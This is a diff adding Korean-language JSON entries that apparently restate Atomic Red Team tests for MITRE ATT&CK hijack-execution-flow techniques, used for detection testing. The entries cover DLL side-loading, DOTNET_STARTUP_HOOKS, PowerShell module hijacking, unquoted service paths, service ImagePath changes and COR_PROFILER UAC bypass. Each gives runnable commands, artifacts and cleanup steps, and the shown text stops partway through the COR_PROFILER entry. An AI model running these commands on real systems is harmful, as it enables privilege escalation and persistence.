+      },
+
+      "cleanup": [
+        "%windir%\\System32\\ualapi.dll 파일을 삭제한다.",
+        "%APPDATA%\\ualapi.dll 파일을 삭제한다.",
+        "Spooler 서비스 시작 유형은 auto 상태로 남으므로 필요 시 별도 명령으로 원래 설정으로 되돌려야 한다(자동 복원 기능은 제공되지 않는다)."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "5898902d-c5ad-479a-8545-6f5ab3cfc87f"
+      }
+    },
+    {
+      "test_id": "T1574.001-4",
+      "name": "DLL Side-Loading using the Notepad++ GUP.exe binary",
+      "platforms": ["windows"],
+
+      "summary": "Notepad++ 업데이트에 사용되는 서명된 GUP.exe 바이너리를 이용해 DLL 사이드로딩을 수행하는 시나리오이다. 취약한 GUP.exe를 지정된 경로에 배치한 뒤 실행하여, 같은 디렉터리의 libcurl.dll 등 악성 DLL이 로드되도록 유도하고 최종적으로 calculator.exe(또는 지정한 프로세스)를 실행한다.",
+
+      "procedure": [
+        "테스트에 사용할 프로세스 이름(<process_name>)과 GUP 실행 파일 경로(<gup_executable>)를 결정한다.",
+        "사전 조건에서 <gup_executable> 경로에 GUP.exe가 존재하는지 확인하고, 없으면 GitHub에서 다운로드해 배치한다.",
+        "명령 프롬프트 또는 PowerShell에서 \"<gup_executable>\"을 실행한다.",
+        "DLL 사이드로딩이 성공하면 지정된 프로세스(기본값 calculator.exe)가 생성되는지 확인한다."
+      ],
+
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": false,
+          "command": "\"<gup_executable>\""
+        }
+      ],
+
+      "prerequisites": [
+        "<gup_executable> 위치에 서명된 GUP.exe 바이너리가 존재해야 한다(없을 경우 사전 준비 단계에서 GitHub에서 다운로드).",
+        "사이드로딩 대상 DLL(예: libcurl.dll)이 GUP.exe와 동일한 디렉터리에 존재해야 악성 DLL이 로드된다.",
+        "테스트 환경에서 Notepad++ 관련 파일 또는 Atomic Red Team에서 제공하는 GUP.exe를 사용하도록 설정해야 한다."
+      ],
+
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "<gup_executable>",
+            "description": "Notepad++ 업데이트용 서명된 GUP.exe 바이너리(필요 시 원격에서 다운로드됨)"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "<gup_executable>",
+            "description": "실행 시 같은 디렉터리의 DLL(libcurl.dll 등)을 로드하는 취약한 GUP.exe"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "GUP.exe",
+            "description": "Notepad++ 서명된 업데이트 바이너리로, 실행 시 같은 폴더의 DLL을 사이드로딩한다.",
+            "commandline_pattern": "*GUP.exe*"
+          },
+          {
+            "name": "<process_name>",
+            "description": "DLL 사이드로딩 성공 시 생성되는 프로세스(기본값 calculator.exe).",
+            "commandline_pattern": "<process_name>"
+          }
+        ],
+        "network": []
+      },
+
+      "cleanup": [
+        "taskkill /F /IM <process_name> >nul 2>&1 명령으로 생성된 프로세스를 강제 종료한다.",
+        "필요 시 테스트용 GUP.exe 및 사이드로딩 DLL을 저장한 디렉터리를 수동으로 정리한다."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "65526037-7079-44a9-bda1-2cb624838040"
+      }
+    },
+    {
+      "test_id": "T1574.001-5",
+      "name": "DLL Side-Loading using the dotnet startup hook environment variable",
+      "platforms": ["windows"],
+
+      "summary": "DOTNET_STARTUP_HOOKS 환경 변수를 사용해 .NET Core 애플리케이션 시작 시 특정 어셈블리(preloader.dll)의 메서드를 자동 실행하는 시나리오이다. dotnet -h 실행만으로도 preloader.dll이 로드되며, 이를 통해 .NET 프로세스 내부에서 악성 코드 실행이나 추가 DLL 사이드로딩을 수행할 수 있다.",
+
+      "procedure": [
+        "테스트에 사용할 프로세스 이름(<process_name>)과 preloader DLL 경로(<preloader_dll>)를 결정한다.",
+        "사전 조건에서 .NET SDK가 설치되어 있는지(C:\\Program Files\\dotnet\\dotnet.exe) 확인하고, 없으면 winget을 통해 설치한다.",
+        "<preloader_dll> 경로에 preloader.dll이 존재하지 않으면 GitHub에서 다운로드해 배치한다.",
+        "명령 프롬프트에서 set DOTNET_STARTUP_HOOKS=\"<preloader_dll>\" 명령을 실행해 현재 세션의 환경 변수로 등록한다.",
+        "dotnet -h > nul 명령을 실행해 .NET 도움말을 호출하면서 preloader.dll이 로드되도록 한다.",
+        "preloader에 구성된 페이로드(예: calculator.exe 실행)가 정상적으로 수행되는지 확인한다."
+      ],
+
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": false,
+          "command": "set DOTNET_STARTUP_HOOKS=\"<preloader_dll>\"\r\ndotnet -h > nul\r\necho."
+        }
+      ],
+
+      "prerequisites": [
+        "C:\\Program Files\\dotnet\\dotnet.exe 경로에 .NET SDK가 설치되어 있어야 한다.",
+        "<preloader_dll> 경로에 preloader.dll 파일이 존재해야 한다(없으면 GitHub에서 다운로드).",
+        "환경 변수 DOTNET_STARTUP_HOOKS를 설정할 수 있는 콘솔 세션이 필요하다.",
+        ".NET Core 애플리케이션(dotnet -h 포함)이 해당 세션에서 실행되어야 preloader.dll이 로드된다."
+      ],
+
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "<preloader_dll>",
+            "description": "DOTNET_STARTUP_HOOKS를 통해 로드되는 preloader.dll 어셈블리"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "<preloader_dll>",
+            "description": ".NET 실행 시 시작 훅으로 로드되는 DLL"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "dotnet.exe",
+            "description": "dotnet -h 실행 시 DOTNET_STARTUP_HOOKS에 지정된 preloader.dll을 로드하는 .NET 런타임 프로세스",
+            "commandline_pattern": "dotnet -h *"
+          },
+          {
+            "name": "<process_name>",
+            "description": "preloader.dll 내부 로직에 의해 생성될 수 있는 프로세스(기본값 calculator.exe).",
+            "commandline_pattern": "<process_name>"
+          }
+        ],
+        "network": []
+      },
+
+      "cleanup": [
+        "taskkill /F /IM <process_name> >nul 2>&1 명령으로 생성된 프로세스를 종료한다.",
+        "현재 콘솔 세션을 종료하거나 DOTNET_STARTUP_HOOKS 환경 변수를 비워 후속 .NET 실행 시 preloader.dll이 로드되지 않도록 한다.",
+        "필요 시 <preloader_dll> 파일을 삭제한다."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "d322cdd7-7d60-46e3-9111-648848da7c02"
+      }
+    },
+    {
+      "test_id": "T1574.001-6",
+      "name": "DLL Search Order Hijacking / Sideloading of KeyScramblerIE.dll via KeyScrambler.exe",
+      "platforms": ["windows"],
+
+      "summary": "공식 KeyScrambler 설치 프로그램을 사용해 KeyScrambler를 설치한 뒤, KeyScrambler.exe를 TEMP 디렉터리로 복사해 실행하는 시나리오이다. 해당 실행 파일은 현재 작업 디렉터리에서 KeyScramblerIE.dll을 찾으므로, 공격자는 동일 폴더에 악성 KeyScramblerIE.dll을 배치해 DLL 사이드로딩 및 검색 순서 하이재킹을 수행할 수 있다.",
+
+      "procedure": [
+        "PowerShell에서 KeyScrambler 설치 프로그램을 공식 사이트에서 %TEMP%\\KeyScrambler_Setup.exe로 다운로드한다.",
+        "다운로드한 설치 프로그램을 /S 옵션으로 무인 설치하여 C:\\Program Files (x86)\\KeyScrambler 아래에 KeyScrambler를 설치한다.",
+        "설치된 C:\\Program Files (x86)\\KeyScrambler\\KeyScrambler.exe를 $env:TEMP\\KeyScrambler.exe로 복사해 권한 문제를 피한다.",
+        "$env:TEMP\\KeyScrambler.exe를 실행하여 현재 디렉터리(TEMP)에서 KeyScramblerIE.dll을 찾도록 유도한다.",
+        "KeyScramblerIE.dll이 없을 경우 누락 팝업이 표시되며, 실제 공격 시에는 동일 경로에 수정된 KeyScramblerIE.dll을 배치해 악성 코드 실행에 활용할 수 있다."
+      ],
+
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": true,
+          "command": "Write-Host 1.Downloading KeyScrambler from official website to temp directory\r\nInvoke-WebRequest -Uri \"https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe\" -OutFile $env:Temp\\KeyScrambler_Setup.exe\r\nWrite-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory\r\nStart-Process -FilePath $env:Temp\\KeyScrambler_Setup.exe -ArgumentList /S -Wait\r\nWrite-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp\r\nCopy-Item \"C:\\Program Files (x86)\\KeyScrambler\\KeyScrambler.exe\" -Destination $env:TEMP\\KeyScrambler.exe\r\nWrite-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup\r\nStart-Process -FilePath $env:Temp\\KeyScrambler.exe\r\nWrite-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker"
+        }
+      ],
+
+      "prerequisites": [
+        "인터넷 연결이 가능해야 하며, https://download.qfxsoftware.com 에 대한 접속이 허용되어야 한다.",
+        "PowerShell에서 Invoke-WebRequest, Start-Process, Copy-Item을 실행할 수 있는 권한이 필요하다.",
+        "KeyScrambler를 설치할 수 있는 관리자 권한이 필요하다.",
+        "테스트 중 TEMP 디렉터리에서 KeyScrambler.exe가 실행될 수 있는 환경이어야 한다."
+      ],
+
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "%TEMP%\\KeyScrambler_Setup.exe",
+            "description": "공식 사이트에서 다운로드한 KeyScrambler 설치 프로그램"
+          },
+          {
+            "path": "C:\\Program Files (x86)\\KeyScrambler",
+            "description": "무인 설치(/S)로 생성된 KeyScrambler 설치 디렉터리와 관련 파일"
+          },
+          {
+            "path": "%TEMP%\\KeyScrambler.exe",
+            "description": "TEMP 디렉터리로 복사된 KeyScrambler 실행 파일로, 현재 작업 디렉터리에서 KeyScramblerIE.dll을 로드하려고 시도한다."
+          }
+        ],
+        "files_read": [
+          {
+            "path": "%TEMP%\\KeyScrambler_Setup.exe",
+            "description": "설치 과정에서 실행되는 KeyScrambler 설치 바이너리"
+          },
+          {
+            "path": "C:\\Program Files (x86)\\KeyScrambler\\KeyScrambler.exe",
+            "description": "TEMP 디렉터리로 복사되는 원본 KeyScrambler 실행 파일"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "KeyScrambler_Setup.exe",
+            "description": "무인 설치 모드(/S)로 KeyScrambler를 설치하는 설치 프로그램",
+            "commandline_pattern": "*KeyScrambler_Setup.exe /S*"
+          },
+          {
+            "name": "KeyScrambler.exe",
+            "description": "현재 디렉터리(TEMP)에서 KeyScramblerIE.dll을 찾으며, 악성 DLL이 존재할 경우 사이드로딩을 통해 실행할 수 있다.",
+            "commandline_pattern": "*\\Temp\\KeyScrambler.exe*"
+          },
+          {
+            "name": "powershell.exe",
+            "description": "Invoke-WebRequest, Start-Process, Copy-Item 등을 사용해 다운로드·설치·복사를 수행하는 PowerShell 프로세스",
+            "commandline_pattern": "*KeyScrambler*"
+          }
+        ],
+        "network": [
+          {
+            "remote_address": "download.qfxsoftware.com",
+            "port": "443",
+            "protocol": "HTTPS",
+            "description": "공식 사이트에서 KeyScrambler 설치 프로그램을 다운로드하는 트래픽"
+          }
+        ]
+      },
+
+      "cleanup": [
+        "팝업 창(누락된 KeyScramblerIE.dll)을 닫아 관련 프로세스를 종료한다.",
+        "%TEMP%\\KeyScrambler_Setup.exe 파일을 삭제한다.",
+        "\"C:\\Program Files (x86)\\KeyScrambler\\Uninstall.exe\" /S를 실행해 KeyScrambler를 제거한다.",
+        "%TEMP%\\KeyScrambler.exe 파일을 삭제한다.",
+        "필요 시 남아 있는 관련 로그 또는 레지스트리 항목을 추가로 정리한다."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "c095ad8e-4469-4d33-be9d-6f6d1fb21585"
+      }
+    }
+  ]
+},
+{
+  "technique_id": "T1574.008",
+  "technique_name": "Hijack Execution Flow: Path Interception by Search Order Hijacking",
+  "tactic": "Privilege Escalation",
+
+  "description": "경로 가로채기(Path Interception)는 실행 파일·스크립트의 검색 순서를 악용해 공격자가 배치한 바이너리를 먼저 실행시키는 기법이다. PowerShell, 기본 모듈, WindowsApps 등의 경로 검색 특성을 활용해 정상 명령과 동일한 이름의 악성 파일을 선행 경로에 두고 하이재킹한다. 이를 통해 재부팅 후에도 유지되는 지속성 확보 및 권한 상승·보안 우회에 활용된다.",
+
+  "tests": [
+    {
+      "test_id": "T1574.008-1",
+      "name": "PowerShell Persistence via hijacking default modules - Get-Variable.exe",
+      "platforms": ["windows"],
+
+      "summary": "Colibri 로더가 사용하는 기법을 모사해, PowerShell 기본 모듈 이름(Get-Variable.exe)과 동일한 이름의 실행 파일을 %LocalAppData%\\Microsoft\\WindowsApps 경로에 생성하는 시나리오이다. 이후 PowerShell -noprofile을 실행할 때 검색 순서를 악용해 공격자 바이너리가 먼저 호출되도록 하여, 계산기(calc)를 실행하는 형태의 지속성/하이재킹 동작을 시뮬레이션한다.",
+
+      "procedure": [
+        "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe( C# 컴파일러)가 존재하는지 확인한다.",
+        "PathToAtomicsFolder\\T1574.008\\bin\\calc.cs 소스 파일이 존재하는지 확인한다.",
+        "csc.exe를 사용해 calc.cs를 컴파일하고, 출력 파일을 %LocalAppData%\\Microsoft\\WindowsApps\\Get-Variable.exe로 지정한다.",
+        "PowerShell -noprofile을 실행해 기본 모듈 호출 과정에서 PATH/검색 순서에 의해 %LocalAppData%\\Microsoft\\WindowsApps\\Get-Variable.exe가 사용되는지(계산기 실행 여부) 확인한다.",
+        "DFIR 관점에서 WindowsApps 폴더 내 Get-Variable.exe 생성 여부와 PowerShell 실행 시 해당 경로 참조 흔적을 수집한다."
+      ],
+
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": false,
+          "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"PathToAtomicsFolder\\T1574.008\\bin\\calc.cs\"\nPowershell -noprofile"
+        }
+      ],
+
+      "prerequisites": [
+        "시스템에 .NET Framework 4.x 및 C# 컴파일러(csc.exe)가 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe 경로에 설치되어 있어야 한다.",
+        "PathToAtomicsFolder\\T1574.008\\bin\\calc.cs C# 소스 파일이 존재해야 한다.",
+        "현재 사용자 계정이 %LocalAppData%\\Microsoft\\WindowsApps 경로에 실행 파일을 생성할 수 있어야 한다.",
+        "Windows 10 이상 환경에서 WindowsApps 경로 및 PowerShell 기본 모듈/명령 검색 순서가 Colibri 기법과 유사하게 동작하는 것이 이상적이다."
+      ],
+
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "%LocalAppData%\\Microsoft\\WindowsApps\\Get-Variable.exe",
+            "description": "PowerShell 기본 모듈 이름을 가장해 생성된 하이재킹용 실행 파일(여기서는 calc 실행용 샘플)"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "PathToAtomicsFolder\\T1574.008\\bin\\calc.cs",
+            "description": "C# 컴파일에 사용된 소스 코드 파일"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "csc.exe",
+            "description": "calc.cs를 컴파일해 Get-Variable.exe를 생성하는 .NET C# 컴파일러 프로세스",
+            "commandline_pattern": "csc.exe /out:*\\Microsoft\\WindowsApps\\Get-Variable.exe *calc.cs"
+          },
+          {
+            "name": "powershell.exe",
+            "description": "PowerShell -noprofile 실행 시 PATH/검색 순서를 통해 Get-Variable.exe를 호출할 수 있는 프로세스",
+            "commandline_pattern": "Powershell -noprofile"
+          },
+          {
+            "name": "calculator",
+            "description": "하이재킹된 Get-Variable.exe 실행 결과로 생성되는 계산기 프로세스(샘플 페이로드)",
+            "commandline_pattern": "*calculator*"
+          }
+        ],
+        "network": []
+      },
+
+      "cleanup": [
+        "Remove-Item \"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" -ErrorAction Ignore 명령으로 생성된 Get-Variable.exe를 삭제한다.",
+        "Stop-Process -Name \"calculator\" 명령으로 실행 중인 계산기 프로세스를 종료한다.",
+        "필요 시 WindowsApps 디렉터리에 유사한 이름의 의심스러운 실행 파일이 추가로 존재하지 않는지 점검한다."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "1561de08-0b4b-498e-8261-e922f3494aae"
+      }
+    }
+  ]
+},
+{
+  "technique_id": "T1574.009",
+  "technique_name": "Hijack Execution Flow: Path Interception by Unquoted Path",
+  "tactic": "Privilege Escalation",
+
+  "description": "따옴표로 감싸지지 않은 서비스 실행 경로(Unquoted Service Path)는 경로에 공백이 포함되어 있을 때, Windows가 앞부분부터 순차적으로 실행 파일을 찾는 특성을 악용하는 기법이다. 공격자는 상위 디렉터리에 같은 이름의 실행 파일을 배치하여, 서비스가 SYSTEM 권한으로 잘못된 프로그램을 실행하도록 만들 수 있다. 이를 통해 권한 상승 및 지속성 확보에 활용된다.",
+
+  "tests": [
+    {
+      "test_id": "T1574.009-1",
+      "name": "Execution of program.exe as service with unquoted service path",
+      "platforms": ["windows"],
+
+      "summary": "공백이 포함된 서비스 실행 경로를 따옴표로 감싸지 않고 설정해 Unquoted Service Path 취약점을 유발하는 시나리오이다. C:\\Program Files\\windows_service.exe를 서비스 경로로 등록한 뒤 C:\\program.exe를 배치하여, 서비스 시작 시 실제로는 C:\\program.exe가 SYSTEM 권한으로 실행되는 동작을 모사한다.",
+
+      "procedure": [
+        "테스트에 사용할 서비스 실행 파일 경로(<service_executable>)를 확인한다(기본값: PathToAtomicsFolder\\T1574.009\\bin\\WindowsServiceExample.exe).",
+        "\"C:\\Program Files\\windows_service.exe\" 위치로 <service_executable>을 복사해 서비스용 실행 파일을 준비한다.",
+        "\"C:\\program.exe\" 위치로 동일한 <service_executable>을 복사해 하이재킹용 실행 파일을 준비한다.",
+        "sc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto 명령으로 따옴표가 없는 경로를 가진 서비스를 생성한다.",
+        "sc start \"Example Service\" 명령으로 서비스를 시작하여, 경로 파싱 특성에 의해 C:\\program.exe가 SYSTEM 권한으로 실행되는지 확인한다(예: C:\\Time.log 생성 여부 등)."
+      ],
+
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "copy \"<service_executable>\" \"C:\\Program Files\\windows_service.exe\"\r\ncopy \"<service_executable>\" \"C:\\program.exe\"\r\nsc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto\r\nsc start \"Example Service\""
+        }
+      ],
+
+      "prerequisites": [
+        "테스트용 실행 파일 <service_executable> (기본: PathToAtomicsFolder\\T1574.009\\bin\\WindowsServiceExample.exe)이 존재해야 한다.",
+        "C:\\Program Files 및 C:\\ 루트 경로에 파일을 생성·복사할 수 있는 관리자 권한이 필요하다.",
+        "sc create, sc start 명령을 실행할 수 있는 권한(일반적으로 관리자 권한)이 필요하다.",
+        "시스템 드라이브가 C:\\로 구성되어 있고, 서비스 경로에 공백이 포함된 환경에서 Unquoted Service Path 동작을 재현할 수 있어야 한다."
+      ],
+
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "C:\\Program Files\\windows_service.exe",
+            "description": "서비스 등록에 사용되는 실행 파일(원본 <service_executable> 복사본)"
+          },
+          {
+            "path": "C:\\program.exe",
+            "description": "Unquoted Service Path 취약점을 악용하기 위해 C:\\ 루트에 배치된 하이재킹용 실행 파일"
+          },
+          {
+            "path": "C:\\Time.log",
+            "description": "WindowsServiceExample.exe가 실행되면서 생성할 수 있는 로그 파일(실제 페이로드 동작 검증용)"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "<service_executable>",
+            "description": "C:\\Program Files 및 C:\\ 루트에 복사되는 원본 서비스 실행 파일"
+          }
+        ],
+        "registry_keys": [
+          {
+            "path": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Example Service",
+            "description": "sc create 명령으로 생성된 서비스 레지스트리 키로, binPath 값에 따옴표가 없는 경로가 설정됨"
+          }
+        ],
+        "processes": [
+          {
+            "name": "services.exe",
+            "description": "Windows 서비스 관리자 프로세스로, Example Service를 시작할 때 실행 파일 경로를 해석한다.",
+            "commandline_pattern": "services.exe"
+          },
+          {
+            "name": "program.exe",
+            "description": "Unquoted Service Path 취약점으로 인해 SYSTEM 권한으로 실행될 수 있는 C:\\program.exe",
+            "commandline_pattern": "C:\\program.exe"
+          },
+          {
+            "name": "windows_service.exe",
+            "description": "의도된 서비스 실행 파일로, 실제 경로는 C:\\Program Files\\windows_service.exe이지만 Unquoted 경로 설정 시 우선되지 않을 수 있다.",
+            "commandline_pattern": "C:\\Program Files\\windows_service.exe"
+          }
+        ],
+        "network": []
+      },
+
+      "cleanup": [
+        "sc stop \"Example Service\" >nul 2>&1 명령으로 Example Service를 중지한다.",
+        "sc delete \"Example Service\" >nul 2>&1 명령으로 Example Service 서비스를 삭제한다.",
+        "\"C:\\Program Files\\windows_service.exe\" 파일을 삭제한다.",
+        "\"C:\\program.exe\" 파일을 삭제한다.",
+        "\"C:\\Time.log\" 파일을 삭제한다(존재하는 경우)."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "2770dea7-c50f-457b-84c4-c40a47460d9f"
+      }
+    }
+  ]
+},
+{
+  "technique_id": "T1574.011",
+  "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness",
+  "tactic": "Privilege Escalation",
+
+  "description": "서비스 레지스트리 키의 권한이 과도하게 완화되어 있을 경우, 공격자가 ImagePath 등의 값을 수정해 임의 실행 파일을 SYSTEM 권한으로 실행시키는 기법이다. 정상 서비스의 레지스트리 권한을 악용해 바이너리 경로를 악성 프로그램으로 교체함으로써 권한 상승과 지속성을 동시에 달성할 수 있다. 이때 레지스트리 ACL(Access Control List) 검사는 탐지·점검 측면에서 핵심 단서가 된다.",
+
+  "tests": [
+    {
+      "test_id": "T1574.011-1",
+      "name": "Service Registry Permissions Weakness",
+      "platforms": ["windows"],
+
+      "summary": "서비스 레지스트리 키의 권한(ACL)을 열람해, 일반 사용자 또는 비관리자 계정이 수정 가능한 취약 서비스가 존재하는지 확인하는 시나리오이다. 취약한 서비스 키를 찾으면 이후 ImagePath 변경을 통한 권한 상승으로 이어질 수 있다.",
+
+      "procedure": [
+        "PowerShell을 관리자 권한 또는 적절한 권한으로 실행한다.",
+        "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* | FL 명령으로 모든 서비스 키의 ACL 정보를 확인한다.",
+        "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name> | FL 명령으로 특정 취약 서비스(<weak_service_name>)의 권한 구성을 상세히 확인한다.",
+        "ACL 정보에서 Authenticated Users, Users 등 일반 계정에 대한 SetValue/FullControl 권한이 있는지 확인한다."
+      ],
+
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": false,
+          "command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* | FL\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name> | FL"
+        }
+      ],
+
+      "prerequisites": [
+        "테스트 대상 Windows 시스템에 PowerShell이 설치되어 있어야 한다.",
+        "HKLM\\SYSTEM\\CurrentControlSet\\Services 레지스트리 키를 열람할 수 있는 권한이 필요하다(일반적으로 읽기 권한은 대부분 계정에 허용됨).",
+        "분석 대상이 될 서비스 이름(<weak_service_name>)을 알고 있어야 한다."
+      ],
+
+      "artifacts": {
+        "files_created": [],
+        "files_read": [],
+        "registry_keys": [
+          {
+            "path": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name>",
+            "description": "권한(ACL)을 점검한 취약 서비스 레지스트리 키. 향후 ImagePath 변경 시 악용 가능."
+          }
+        ],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "서비스 레지스트리 키의 ACL 정보를 조회하는 PowerShell 프로세스",
+            "commandline_pattern": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services*"
+          }
+        ],
+        "network": []
+      },
+
+      "cleanup": [
+        "이 테스트는 레지스트리 키를 읽기만 하므로 별도의 클린업 작업이 필요하지 않다.",
+        "필요 시 PowerShell 세션을 종료한다."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "f7536d63-7fd4-466f-89da-7e48d550752a"
+      }
+    },
+    {
+      "test_id": "T1574.011-2",
+      "name": "Service ImagePath Change with reg.exe",
+      "platforms": ["windows"],
+
+      "summary": "권한이 취약한 서비스의 ImagePath 레지스트리 값을 악성 실행 파일 경로로 변경하는 시나리오이다. 먼저 benign 서비스(<weak_service_path>)로 서비스를 생성한 뒤, reg.exe를 사용해 해당 서비스의 ImagePath를 악성 경로(<malicious_service_path>, 기본 cmd.exe)로 교체한다. 이후 서비스가 시작되면 악성 경로가 서비스 권한(잠재적으로 SYSTEM)으로 실행될 수 있다.",
+
+      "procedure": [
+        "테스트에 사용할 취약 서비스 이름(<weak_service_name>), 원래 서비스 경로(<weak_service_path>), 악성 서비스 경로(<malicious_service_path>)를 결정한다.",
+        "사전 조건 스크립트를 통해 <weak_service_name> 서비스가 존재하는지 확인하고, 없으면 sc.exe create <weak_service_name> binpath= \"<weak_service_path>\" 명령으로 benign 서비스를 생성한다.",
+        "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name>\" /f /v ImagePath /d \"<malicious_service_path>\" 명령으로 ImagePath 값을 악성 경로로 변경한다.",
+        "이후(테스트 외부 단계) 서비스 <weak_service_name>를 시작하면, 설정된 <malicious_service_path>가 서비스 권한으로 실행될 수 있다."
+      ],
+
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name>\" /f /v ImagePath /d \"<malicious_service_path>\""
+        }
+      ],
+
+      "prerequisites": [
+        "<weak_service_name> 서비스가 시스템에 존재해야 한다(없을 경우 sc.exe create <weak_service_name> binpath= \"<weak_service_path>\" 로 생성).",
+        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name> 레지스트리 키에 ImagePath 값을 변경할 수 있는 권한이 필요하다(일반적으로 관리자/ SYSTEM 또는 취약 권한이 부여된 사용자).",
+        "악성 경로로 지정할 실행 파일(<malicious_service_path>, 기본 %windir%\\system32\\cmd.exe)이 존재해야 한다.",
+        "reg.exe 및 sc.exe 명령을 실행할 수 있는 콘솔 환경(관리자 권한)이 필요하다."
+      ],
+
+      "artifacts": {
+        "files_created": [],
+        "files_read": [],
+        "registry_keys": [
+          {
+            "path": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name>",
+            "description": "ImagePath 값이 benign 경로에서 악성 경로(<malicious_service_path>)로 변경된 서비스 레지스트리 키"
+          }
+        ],
+        "processes": [
+          {
+            "name": "reg.exe",
+            "description": "서비스 레지스트리 키의 ImagePath 값을 수정하는 유틸리티",
+            "commandline_pattern": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name>\" * /v ImagePath /d *"
+          },
+          {
+            "name": "sc.exe",
+            "description": "사전 조건에서 테스트용 취약 서비스를 생성 또는 삭제하는 서비스 제어 유틸리티",
+            "commandline_pattern": "sc.exe create <weak_service_name> binpath=*"
+          }
+        ],
+        "network": []
+      },
+
+      "cleanup": [
+        "sc.exe delete <weak_service_name> 명령으로 테스트에 사용한 서비스를 삭제한다.",
+        "필요 시 HKLM\\SYSTEM\\CurrentControlSet\\Services 아래에서 <weak_service_name> 관련 레지스트리 키가 완전히 제거되었는지 확인한다."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "f38e9eea-e1d7-4ba6-b716-584791963827"
+      }
+    }
+  ]
+},
+{
+  "technique_id": "T1574.012",
+  "technique_name": "Hijack Execution Flow: COR_PROFILER",
+  "tactic": "Privilege Escalation",
+
+  "description": "COR_PROFILER 기법은 .NET CLR 프로파일러 환경 변수와 COM CLSID를 악용해, CLR이 로드될 때 공격자가 지정한 프로파일러 DLL을 먼저 로드하도록 만드는 방법이다. 공격자는 Event Viewer, PowerShell 등 고무결(High Integrity) 프로세스의 CLR 로딩 시점을 가로채 임의 코드를 실행하고, UAC 우회 또는 권한 상승과 지속성 확보에 활용할 수 있다. 사용자/시스템/프로세스 범위 환경 변수 설정 등 다양한 변종이 존재한다.",
+
+  "tests": [
+    {
+      "test_id": "T1574.012-1",
+      "name": "User scope COR_PROFILER",
+      "platforms": ["windows"],
+
+      "summary": "사용자 범위(HKCU)에서 COR_PROFILER 관련 레지스트리와 환경 변수를 설정해 .NET 프로파일러를 활성화하는 시나리오이다. 커스텀 CLSID와 프로파일러 DLL 경로를 HKCU에 등록하고, Event Viewer(eventvwr.msc)를 실행해 CLR이 로드될 때 프로파일러 DLL(T1574.012x64.dll)이 로드되도록 유도한다. 로컬 관리자 계정일 경우 UAC를 우회해 notepad.exe가 높은 무결성(High Integrity)으로 실행될 수 있다.",
+
+      "procedure": [
+        "<file_name> 위치에 T1574.012x64.dll 프로파일러 DLL이 존재하는지 확인한다(없으면 사전 조건 단계에서 GitHub에서 다운로드).",
+        "PowerShell에서 HKCU:\\Software\\Classes\\CLSID\\<clsid_guid>\\InprocServer32 키를 생성하고 기본값으로 <file_name> 경로를 설정한다.",
+        "HKCU:\\Environment 경로에 COR_ENABLE_PROFILING=1, COR_PROFILER=<clsid_guid>, COR_PROFILER_PATH=<file_name> 환경 변수 값을 생성한다.",
+        "MMC.EXE EVENTVWR.MSC 명령을 실행해 Event Viewer를 실행하고, CLR 로딩 시 프로파일러 DLL이 호출되는지(예: notepad.exe 실행 여부) 확인한다."
+      ],
+
